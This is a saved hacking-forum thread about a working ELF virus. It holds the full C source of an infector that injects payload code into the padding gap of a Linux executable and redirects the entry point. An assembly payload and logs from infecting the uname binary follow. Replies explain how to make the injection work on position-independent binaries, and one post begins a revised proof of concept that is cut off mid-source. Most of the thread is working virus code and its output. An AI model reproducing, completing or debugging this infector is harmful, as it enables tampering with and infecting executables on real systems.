<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Doubt infect ELF - #4 by jbx81 - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Hi all. 
I testing using the follow post https://0x00sec.org/t/elfun-file-injector/410, but not work. bellow the post code i’m using. 
------------------------------------ infecta.c --------------------------------------&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="../13605.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Doubt infect ELF&#39;" href="../13605.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/doubt-infect-elf/13605/4" />
<meta name="twitter:url" content="https://0x00sec.org/t/doubt-infect-elf/13605/4" />
<meta property="og:title" content="Doubt infect ELF" />
<meta name="twitter:title" content="Doubt infect ELF" />
<meta property="og:description" content="If you’re trying to infect a DYN ELF you have only find offset between real e_entry and the new entry point address.  DYN elf first load libraries, then move e_entry to edi (x86) or to r12 (x86_64) and jump  so in your shellcode you have only to sub the offset from edi/r12 (so you will point to original entry) than save the address on the stack or keep it and jump to address. i have done a python script for that, if i find it i will share.  I have made a PoC.  infecta.c  /*  * infecta.c  *  *  C..." />
<meta name="twitter:description" content="If you’re trying to infect a DYN ELF you have only find offset between real e_entry and the new entry point address.  DYN elf first load libraries, then move e_entry to edi (x86) or to r12 (x86_64) and jump  so in your shellcode you have only to sub the offset from edi/r12 (so you will point to original entry) than save the address on the stack or keep it and jump to address. i have done a python script for that, if i find it i will share.  I have made a PoC.  infecta.c  /*  * infecta.c  *  *  C..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="article:published_time" content="2019-05-12T22:19:54+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="../13605.html">Doubt infect ELF</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Doubt infect ELF">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content>
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/spiderslack"><span itemprop="name">spiderslack</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/6/62314669c3e0b5471bba36d36f333139b31c8f3d.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-05-11T23:26:07Z" class="post-time">
May 11, 2019, 11:26pm
</time>
<meta itemprop="dateModified" content="2019-05-11T23:26:07Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Hi all.</p>
<p>I testing using the follow post <a href="../../elfun-file-injector/410.html" class="inline-onebox">ELFun File Injector</a>, but not work. bellow the post code i’m using.</p>
<p>------------------------------------ infecta.c ------------------------------------------------</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;


#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;

#include &lt;elf.h&gt;
#include &lt;sys/mman.h&gt;


/* Helper functions */
static int get_file_size (int fd)
{
        struct stat _info;
        fstat (fd, &amp;_info);
        return _info.st_size;
}

/* Open a file and map it in memory for easy update */
int elfi_open_and_map (char *fname, void **data, int *len)
{
        int size;
        int fd;

        if ((fd = open (fname, O_APPEND | O_RDWR, 0)) &lt; 0)
        {
                perror ("open:");
                exit (1);
        }

        size = get_file_size (fd);
        if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED)
        {
                perror ("mmap:");
                exit (1);
        }

        printf ("+ Arquivo mapeado (%d bytes ) em %p\n", size, data);
        *len = size;
        return fd;
}


#ifdef DEBUG
/* Debug function to dump registers */
void
elfi_dump_segments (void *d)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg;
  int         n_seg = elf_hdr-&gt;e_phnum;
  int         i;

//  printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
  for (i = 0; i &lt; n_seg; i++)
    {
        printf (" [INFO] Segment %d: Type: %8x (%x) Offset: %8x "
                "FSize:%8x MSize:%8x\n",
                i, elf_seg-&gt;p_type, elf_seg-&gt;p_flags,
                (unsigned int)elf_seg-&gt;p_offset,
                (unsigned int)elf_seg-&gt;p_filesz,
                (unsigned int)elf_seg-&gt;p_memsz);

      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg
                            + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

}
#endif

// len: tamanho do gap
// p: final do segmento
// d: arquivo elf com as section e program table
// fsize: tamanho do binario
//
//         /* Find executable segment and obtain offset and gap size */
//        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);
Elf64_Phdr* elfi_find_gap(void *mapeado, int TamanhoArquivo, int *p, int *len)
{
        // struct header ELF
        Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) mapeado;
        // struct program header
        Elf64_Phdr* elf_program, *text_program_vitima;
        // e_phnum: numero de entradas na tabela programa
        int         n_seg = elf_hdr-&gt;e_phnum;
        int         i;
        int         text_end, gap=TamanhoArquivo;

        //printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));
        //printf("O tamanho da variavel elf_hdr: %ld \n", sizeof(elf_hdr));
        //printf("O tamanho de struct elf_hdr-&gt;e_phoff: %ld \n", sizeof(elf_hdr-&gt;e_phoff));



        // e_phoff: aponta para o inicio da tabela de programa
        elf_program = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
//      printf("p_type %d \n", elf_seg-&gt;p_type);

        for (i = 0; i &lt; n_seg; i++)
        {
        //      printf("elf_program-&gt;p_flags: %#x\n", elf_program-&gt;p_flags);
        //      printf("elf_program-&gt;p_type: %#x\n", elf_program-&gt;p_type);
//      printf("elf_program-&gt;p_offset: %#lx\n", elf_program-&gt;p_offset);
        // p_flags: flags define o tipo do segmento(cabecalho de programa
        // Name         | Value   | Meaning
        // PF_X         | 0x1     | Execute
        // PF_W         | 0x2     | Write
        // PF_R         | 0x4     | Read
        // PF_MASKPROC  | 0xf0000000 | Unspecified
        // 0x1 and 0x011 = 1 (verdadeiro)
        // 0x2 and 0x011 = 0 (falso)
        // 0x4 and 0x011 = 0 (falso)
        // 0xf0000000 and 0x011 = 0 (falso)
        // Entao o comando: elf_seg-&gt;p_flags &amp; 0x011 -&gt; Procura por um segmento "execute"
        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; elf_program-&gt;p_flags &amp; 0x011)
      {

                        printf ("+ Processando Vitima -&gt; Encontrado segmento .text executavel (#%d)\n", i);
        /*              printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %ld \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);
*/
                        //text_seg = elf_seg(o segmento progam atual
                        text_program_vitima = elf_program;


                        // elf_program-&gt;p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_filesz: Size in bytes of the segment in the file image. May be 0.
                        // variavel text_end pega o tamanho do segmento text
                        text_end = elf_program-&gt;p_offset + elf_program-&gt;p_filesz;
//                      printf("o valor de text_end: %d \n", text_end);
      } else {
                        //p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_offset do segundo segmento LOAD do tipo RW - o final do
                        // segmento LOAD Executavel
                        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; (elf_program-&gt;p_offset - text_end) &lt; gap)
                        {

/*                      printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %lx \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);

                        printf("o valor de text_end: %d \n", text_end);
                        printf("o valor de gap: %d \n", gap);
*/
                        printf ("   * Processando Vitima -&gt; Encontrado segmento LOAD (#%d) fechado para .text (offset: 0x%x)\n", i, (unsigned int)elf_program-&gt;p_offset);

                                gap = elf_program-&gt;p_offset - text_end;
                        }
                }
                // q
                // e_phentsize: contem o tamanho de uma entrada de uma tabela de secao
      elf_program = (Elf64_Phdr *) ((unsigned char*) elf_program + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

        *p = text_end;
        *len = gap;


        return text_program_vitima;
}



Elf64_Shdr *elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  // e_shoff:   Points to the start of the section header table.
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr-&gt;e_shoff);
  // e_shstrndx: Contains index of the section header table entry that contains the section names.
  Elf64_Shdr *sh_strtab = &amp;shdr[elf_hdr-&gt;e_shstrndx];
  // sh_offset: Offset of the section in the file image.
  const char *const sh_strtab_p = data + sh_strtab-&gt;sh_offset;

  // e_shnum: Contains the number of entries in the section header table.
  printf ("+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: %d . Procurando pela seção '%s'\n", elf_hdr-&gt;e_shnum, name);


  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++)
  {
//      printf("Processamento Payload -&gt; O shdr[%d].sh_name: %x \n", i, shdr[i].sh_name);
        sname = (char*) (sh_strtab_p + shdr[i].sh_name);

        printf(" + Processando payload -&gt; sname: '%s'\n", sname);


        if (!strcmp (sname, name))
        {
                printf("entrou no if retornando \n");
                printf("shdr-&gt;sh_name: %x  \n", shdr[i].sh_name);


                printf("shdr-&gt;sh_type: %x \n", shdr[i].sh_type);
                printf("shdr-&gt;sh_addr: %lx \n", shdr[i].sh_addr);
                return &amp;shdr[i];
        }
  }

  return NULL;
}



// MapeadoVitima + p: e o arquivo vitima mapeado mais o program header
// len: tamanho do gap
// pat: padrao a buscar
// val: entrypoint do arquivo elf vitima
//
//  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);
int elfi_mem_subst(void *m, int len, long pat, long val)
{
        // obtem o endereco do program header da vitima
        unsigned char *p = (unsigned char*)m;
        long v;
        int i, r;

        /*
        printf("p: %hhn\n", p);
        printf("pat: %lx\n", pat);
        printf("val: %lx\n", val);
        printf("entrando no for\n\n");
*/
//      printf("len: %d \n", len);


        for (i = 0; i &lt; len; i++)
        {
                v = *((long*)(p+i));
                // faz um xor da variavel v e varial pat
                r = v ^pat;


//              printf("v: %lx\n", v);
        //      printf("r: %x\n", r);

                if (r ==0)
                {
                        printf ("+ Padrão %lx encontrado no offset %d -&gt; %lx\n", pat, i, val);
                        *((long*)(p+i)) = val;
                        return 0;
                }
        }
        return -1;
}

int main (int argc, char *argv[])
{
        void        *MapeadoVitima, *MapeadoPayload;
        int         Vitima_fd, payload_fd;
        int         TamanhoVitima, TamanhoPayload;
        // Struct para o header ELF
        Elf64_Ehdr* elf_hdr;
        // Struct para program header
        Elf64_Phdr  *vitima_text_program;
        // struct para section header
        Elf64_Shdr  *payload_text_section;
        // struct de enderecos base
        Elf64_Addr  base, ep;
        //variavel len = gap
        //variavel p=final do segmento LOAD executavel
        int         p, len;


        printf ("Exemplo de virus ELF\n\n");
        if (argc != 3)
        {
                fprintf (stderr, "Uso:\n  %s &lt;arquivo ELF&gt; &lt;payload&gt;\n", argv[0]);
                exit (1);
        }

        /* Open and map target ELF */
        Vitima_fd = elfi_open_and_map (argv[1], &amp;MapeadoVitima, &amp;TamanhoVitima);

        /* Get Application Entry point */
        elf_hdr = (Elf64_Ehdr *) MapeadoVitima;
        ep = elf_hdr-&gt;e_entry;
        printf ("+ Processando Vitima -&gt; Valor do Entry point: %p\n", (void*) ep);

#ifdef DEBUG
  elfi_dump_segments (d);
#endif

        /* Find executable segment and obtain offset and gap size */
        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);

        // p_vaddr: Virtual address of the segment program in memory
        base = vitima_text_program-&gt;p_vaddr;

        printf ("+ Processando vitima -&gt; Endereco Base(Base Address) : 0x%p\n", (void*)base);

        /* Process payload */
        payload_fd = elfi_open_and_map (argv[2], &amp;MapeadoPayload, &amp;TamanhoPayload);

        // funcao que busca o segmento .text
        // MapeadoPayload: arquivo elf a ser injetado na vitima
        // payload_text_section: retorna com o section segmento do .text a ser injetado
        payload_text_section = elfi_find_section (MapeadoPayload, ".text");

        //mostraSectionHeaderELF(payload_text_section);

  /* XXX: Looks like we do not really have to patch the segment sizes */
  /*
  vitima_text_program-&gt;p_filesz += payload_text_section-&gt;sh_size;
  vitima_text_program-&gt;p_memsz += payload_text_section-&gt;sh_size;
  */

        printf ("+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset %lx (Tamanho: %lx bytes)\n",  payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size);

        if (payload_text_section-&gt;sh_size &gt; len)
        {
                fprintf (stderr, "- Processando Payload -&gt; Arquivo Payload muito grande, Não é possivel infectar.\n");
                exit (1);
        }
  /* Copy payload in the segment padding area */
  // memmove(dest, src, count): copia count bytes do buffer apontado por src para o buffer apontado por dest.
  //

  memmove (MapeadoVitima + p, MapeadoPayload + payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size );

  /* Patch return address */
  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);

  /* Patch entry point */
  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);

  /* Close files and actually update target file */
  close (payload_fd);
  close (Vitima_fd);

  return 0;
}
</code></pre>
<p>My payload is:</p>
<p>------------payload.asm-------------</p>
<pre><code>section .text
        global _start
_start:
        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

        mov rax, 0x11111111
        jmp rax
align 8
        msg     db 'Arquivo infectado Teste',0x0a,0
        msg_end db 0x0
</code></pre>
<p>I am trying to infect the uname binary.</p>
<blockquote>
<p>root@bumblee:~/dev/infectELF/versao3# /bin/uname<br>
Linux<br>
root@bumblee:~/dev/infectELF/versao3#</p>
</blockquote>
<pre><code>root@bumblee:~/dev/infectELF/versao3# ./infecta ./uname payload
Exemplo de virus ELF

+ Arquivo mapeado (35032 bytes ) em 0x7ffd3f89dee0
+ Processando Vitima -&gt; Valor do Entry point: 0x1f60
+ Processando Vitima -&gt; Encontrado segmento .text executavel (#2)
   * Processando Vitima -&gt; Encontrado segmento LOAD (#3) fechado para .text (offset: 0x7990)
+ Processando vitima -&gt; Endereco Base(Base Address) : 0x(nil)
+ Arquivo mapeado (808 bytes ) em 0x7ffd3f89dee8
+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: 5 . Procurando pela seção '.text'
 + Processando payload -&gt; sname: ''
 + Processando payload -&gt; sname: '.text'
entrou no if retornando
shdr-&gt;sh_name: 1b
shdr-&gt;sh_type: 1
shdr-&gt;sh_addr: 400080
+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset 80 (Tamanho: 3a bytes)
+ Padrão 11111111 encontrado no offset 25 -&gt; 1f60
root@bumblee:~/dev/infectELF/versao3#
</code></pre>
<p>note the entrypoint address of the original binary file is 0x1f60</p>
<blockquote>
<p>root@bumblee:~/dev/infectELF/versao3# readelf -h /bin/uname<br>
ELF Header:<br>
Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00<br>
Class: ELF64<br>
Data: 2’s complement, little endian<br>
Version: 1 (current)<br>
OS/ABI: UNIX - System V<br>
ABI Version: 0<br>
Type: DYN (Shared object file)<br>
Machine: Advanced Micro Devices X86-64<br>
Version: 0x1<br>
Entry point address: 0x1f60<br>
Start of program headers: 64 (bytes into file)<br>
Start of section headers: 33240 (bytes into file)<br>
Flags: 0x0<br>
Size of this header: 64 (bytes)<br>
Size of program headers: 56 (bytes)<br>
Number of program headers: 9<br>
Size of section headers: 64 (bytes)<br>
Number of section headers: 28<br>
Section header string table index: 27<br>
root@bumblee:~/dev/infectELF/versao3#</p>
</blockquote>
<p>after infecting it it changes the entrypoint to address 0x6e80 by picking up the code of 6e80 I see the following opcodes(i using the xxd command)</p>
<blockquote>
<p>00006e80: b801 0000 00bf 0100 0000 488d 350f 0000<br>
00006e90: 00ba 2600 0000 0f05 b860 1f00 00ff e0 000<br>
00006ea0: 0072 7175 6976 6f20 696e 6665 6374 6164<br>
00006eb0: 6f20 5375 6375 7269 2048 6163 6b65 7220<br>
00006ec0: 436c 7562 0a00 0000 0000 0000 0000 0000</p>
</blockquote>
<p>copying the opcode string and playing on the site <a href="http://disassembler.io" rel="noopener nofollow ugc">disassembler.io</a>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/62314669c3e0b5471bba36d36f333139b31c8f3d.png" alt="hacker01" data-base62-sha1="e0EmwXSGSE7eiNEVWs4weOkZDVX" width="690" height="299"></p>
<p>note that the assembly code is to display the message and then jump to the address 0x1f60 which is the oirginal entrypoint of the uname binary file. But I get the message of segment fault</p>
<pre><code>root@bumblee:~/dev/infectELF/versao3# ./uname
Arquivo infectado teste
Segmentation fault (core dumped)
root@bumblee:~/dev/infectELF/versao3#
</code></pre>
<p>Could someone help me where I’m wrong?</p>
<pre><code>root@bumblee:~/dev/infectELF/versao3# dmesg
[ 1623.698745] uname[1402]: segfault at 1f60 ip 0000560080a57e9d sp 00007ffe8923a260 error 6 in uname[560080a51000+7000]
root@bumblee:~/dev/infectELF/versao3#
</code></pre>
<p>In dmesg I have a message but I do not quite understand</p>
<p>someone can help me understand what I’m doing wrong. Thank you very much in advance</p>
<p>Regards</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-05-12T00:02:42Z" class="post-time">
May 12, 2019, 12:02am
</time>
<meta itemprop="dateModified" content="2019-05-12T00:02:42Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Would be helpful to ping the author <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> .</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-05-12T07:53:37Z" class="post-time">
May 12, 2019, 7:53am
</time>
<meta itemprop="dateModified" content="2019-05-12T07:53:37Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/spiderslack">@spiderslack</a>,</p>
<p>You are trying to infect a PIE binary. PIE binaries get mapped at random position in memory so you cannot just jump to a fixed address. You may need to change your shellcode to use an offset or some other indirect technique to jump into your code.</p>
<p>Also this may give you some other hints.</p>
<aside class="quote" data-post="5" data-topic="6713">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../../user_avatar/0x00sec.org/0x00pf/40/13708_2.png" class="avatar">
<a href="../../segfaults-with-polycrypt-tutorial/6713/5.html">Segfaults With Polycrypt Tutorial</a> <a class="badge-wrapper  bullet" href="../../../c/support/52.html"><span class="badge-category-bg" style="background-color: #BF1E2E;"></span><span style data-drop-close="true" class="badge-category clear-badge" title="Asking questions or not knowing something is not a bad thing on 0x00sec, in fact its something very critical to learning. However, asking in the correct way is very important. Posts like &quot;Plz help me hax my sk00l pls&quot; are considered spammy, and will be aggresively deleted. Please realise that nobody here owes you anything, it is up to you to gain respect and ask correctly. You do not deserve help, however people here are happy to help.">Questions</span></a>
</div>
<blockquote>
Now you can try to make it work with PIE binaries. Hint: Check /proc/PID/maps to figure out the real address at run-time.
Do not forget to make a PR on my repo if you make it work <img src="../../../images/emoji/twitter/wink.png%3Fv=9" title="wink" alt="wink" class="emoji">
</blockquote>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/jbx81"><span itemprop="name">jbx81</span></a>
(jbx81)
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-05-12T22:19:54Z" class="post-time">
May 12, 2019, 10:19pm
</time>
<meta itemprop="dateModified" content="2019-05-13T11:21:12Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>If you’re trying to infect a DYN ELF you have only find offset between real e_entry and the new entry point address.<br>
DYN elf first load libraries, then move e_entry to edi (x86) or to r12 (x86_64) and jump<br>
so in your shellcode you have only to sub the offset from edi/r12 (so you will point to original entry) than save the address on the stack or keep it and jump to address. i have done a python script for that, if i find it i will share.</p>
<p>I have made a PoC.</p>
<p>infecta.c</p>
<pre><code>/*
 * infecta.c
 *
 *  Created on: May 13, 2019
 *
 */
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;


#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/stat.h&gt;

#include &lt;elf.h&gt;
#include &lt;sys/mman.h&gt;


/* Helper functions */
static int get_file_size (int fd)
{
        struct stat _info;
        fstat (fd, &amp;_info);
        return _info.st_size;
}

/* Open a file and map it in memory for easy update */
int elfi_open_and_map (char *fname, void **data, int *len)
{
        int size;
        int fd;

        if ((fd = open (fname, O_APPEND | O_RDWR, 0)) &lt; 0)
        {
                perror ("open:");
                exit (1);
        }

        size = get_file_size (fd);
        if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC, MAP_SHARED, fd, 0)) == MAP_FAILED)
        {
                perror ("mmap:");
                exit (1);
        }

        printf ("+ Arquivo mapeado (%d bytes ) em %p\n", size, data);
        *len = size;
        return fd;
}


#ifdef DEBUG
/* Debug function to dump registers */
void
elfi_dump_segments (void *d)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg;
